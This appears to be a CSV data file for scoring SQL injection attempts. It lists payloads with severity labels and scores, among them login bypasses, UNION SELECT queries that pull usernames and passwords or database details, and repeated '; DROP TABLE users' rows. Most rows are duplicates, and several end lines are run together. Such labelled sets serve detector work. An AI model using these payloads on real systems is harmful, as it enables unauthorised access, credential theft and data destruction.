' OR 1=1 --,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' UNION SELECT NULL version() current_user --,high,70
' UNION SELECT NULL version() current_user --,high,70
' OR 1=1 --,low,10
' UNION SELECT username password FROM users -- /* test */,medium,40
' UNION SELECT username password FROM users -- /* test */,medium,40
' UNION SELECT username password FROM users -- /* test */,medium,40
' OR 1=1 -- /* test */,low,10
' OR 'a'='a,low,10
' OR 'a'='a,low,10
'; DROP TABLE users; -- /* test */,critical,100
'; DROP TABLE users; -- /* test */,critical,100
'; DROP TABLE users; -- /* test */,critical,100
'; DROP TABLE users; -- /* test */,critical,100
'; DROP TABLE users; -- /* test */,critical,100
'; DROP TABLE users; -- /* test */,critical,100
'; DROP TABLE users; -- /* test */,critical,100
'; DROP TABLE users; -- /* test */,critical,100
admin' --,low,10
admin' --,low,10
admin' --,low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' OR 1=1 -- /* test */,low,10
' OR 'a'='a,low,10
' OR 'a'='a,low,10
' OR 'a'='a,low,10
' OR 'a'='a,low,10
' OR TRUE --,low,10
' OR TRUE --,low,10
' OR TRUE --,low,10
' OR TRUE --,low,10
admin' --,low,10
admin' --,low,10
admin' --,low,10
admin' --,low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' OR 1=1 -- /* test */,low,10
' OR 1=1 -- /* test */,low,10
' OR 'a'='a,low,10
' OR 'a'='a,low,10
' OR 'a'='a,low,10
' OR 'a'='a,low,10
' OR TRUE --,low,10
' OR TRUE --,low,10
' OR TRUE --,low,10
' OR TRUE --,low,10
admin' --,low,10
admin' --,low,10
admin' --,low,10
admin' --,low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' OR 1=1 -- /* test */,low,10
' OR 'a'='a,low,10
' OR 'a'='a,low,10
' OR 'a'='a,low,10
' OR 'a'='a,low,10
' OR TRUE --,low,10
' OR TRUE --,low,10
' OR TRUE --,low,10
' OR TRUE --,low,10
admin' --,low,10
admin' --,low,10
admin' --,low,10
admin' --,low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
' OR TRUE --,low,10
' OR TRUE --,low,10
admin' --,low,10
1' OR '1'='1,low,10
admin' --,low,10
1' OR '1'='1,low,10
1' OR '1'='1,low,10
' OR 1=1 --,low,101' OR '1'='1,low,10
1' OR '1'='1,low,10
' OR 1=1 --,low,101' OR '1'='1,low,10
1' OR '1'='1,low,10
